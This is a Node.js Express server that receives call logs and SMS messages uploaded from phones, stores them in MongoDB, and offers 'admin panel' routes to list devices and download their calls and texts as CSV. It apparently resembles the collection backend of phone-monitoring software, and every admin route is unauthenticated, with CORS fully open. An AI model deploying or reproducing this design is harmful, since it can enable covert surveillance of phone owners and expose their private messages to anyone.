const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "10mb" }));

// Connect to MongoDB
mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.log("❌ DB error:", err));

// Device schema
const DeviceSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true },
  deviceName: String,
  firstSync: Date,
  logs: Array,
});
const Device = mongoose.model("Device", DeviceSchema);

// Health check
app.get("/", (req, res) => res.send("Call Log Server is running ✅"));

// App posts logs here
app.post("/api/sync", async (req, res) => {
  try {
    const { deviceId, deviceName, logs } = req.body;
    if (!deviceId || !logs) {
      return res.status(400).json({ error: "Missing data" });
    }

    await Device.findOneAndUpdate(
      { deviceId },
      { deviceId, deviceName, logs, firstSync: new Date() },
      { upsert: true, new: true }
    );

    console.log(`📥 Received ${logs.length} logs from ${deviceName}`);
    res.json({ success: true, count: logs.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin panel: list devices
app.get("/api/devices", async (req, res) => {
  const devices = await Device.find().sort({ firstSync: -1 });
  res.json(devices);
});

// Admin panel: get one device
app.get("/api/devices/:deviceId", async (req, res) => {
  const d = await Device.findOne({ deviceId: req.params.deviceId });
  res.json(d);
});

// Download device logs as CSV
app.get("/api/devices/:deviceId/csv", async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).send("Device not found");

    const header = "Name,Number,Type,Duration(s),Time\n";
    const rows = (device.logs || [])
      .map((l) => {
        const name = (l.name || "").replace(/,/g, " ");
        const number = (l.number || "").replace(/,/g, " ");
        const type = (l.type || "").replace(/,/g, " ");
        const duration = l.duration || 0;
        const time = new Date(l.timestamp).toISOString();
        return `${name},${number},${type},${duration},${time}`;
      })
      .join("\n");

    const filename = `${(device.deviceName || "device").replace(/[^a-z0-9]/gi, "_")}_call_logs.csv`;
    res.setHeader("Content-Type", "text/csv");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.send(header + rows);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// ==================== SMS ENDPOINTS ====================

// SMS schema
const SmsSchema = new mongoose.Schema({
  deviceId: { type: String, unique: true },
  deviceName: String,
  messages: Array,
  lastSync: Date,
});
const Sms = mongoose.model("Sms", SmsSchema);

// App posts SMS here
app.post("/api/sms-sync", async (req, res) => {
  try {
    const { deviceId, deviceName, messages } = req.body;
    if (!deviceId || !messages) {
      return res.status(400).json({ error: "Missing data" });
    }

    // Merge with existing messages (avoid duplicates by timestamp+body)
    const existing = await Sms.findOne({ deviceId });
    let allMessages = messages;
    if (existing && existing.messages) {
      const seen = new Set(existing.messages.map((m) => `${m.timestamp}|${m.body}`));
      const newOnes = messages.filter((m) => !seen.has(`${m.timestamp}|${m.body}`));
      allMessages = [...existing.messages, ...newOnes];
    }

    await Sms.findOneAndUpdate(
      { deviceId },
      { deviceId, deviceName, messages: allMessages, lastSync: new Date() },
      { upsert: true, new: true }
    );

    console.log(`📥 Received ${messages.length} SMS from ${deviceName}`);
    res.json({ success: true, count: messages.length, total: allMessages.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin panel: list SMS devices
app.get("/api/sms-devices", async (req, res) => {
  const devices = await Sms.find().sort({ lastSync: -1 });
  res.json(devices);
});

// Admin panel: get one SMS device
app.get("/api/sms-devices/:deviceId", async (req, res) => {
  const d = await Sms.findOne({ deviceId: req.params.deviceId });
  res.json(d);
});

// Download SMS as CSV
app.get("/api/sms-devices/:deviceId/csv", async (req, res) => {
  try {
    const device = await Sms.findOne({ deviceId: req.params.deviceId });
    if (!device) return res.status(404).send("Device not found");

    const header = "Sender,Body,Time\n";
    const rows = (device.messages || [])
      .map((m) => {
        const sender = (m.sender || "").replace(/,/g, " ").replace(/\n/g, " ");
        const body = (m.body || "").replace(/,/g, " ").replace(/\n/g, " ");
        const time = new Date(m.timestamp).toISOString();
        return `${sender},${body},${time}`;
      })
      .join("\n");

    const filename = `${(device.deviceName || "device").replace(/[^a-z0-9]/gi, "_")}_sms.csv`;
    res.setHeader("Content-Type", "text/csv");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.send(header + rows);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// ==================== END SMS ENDPOINTS ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => console.log(`🚀 Port ${PORT}`));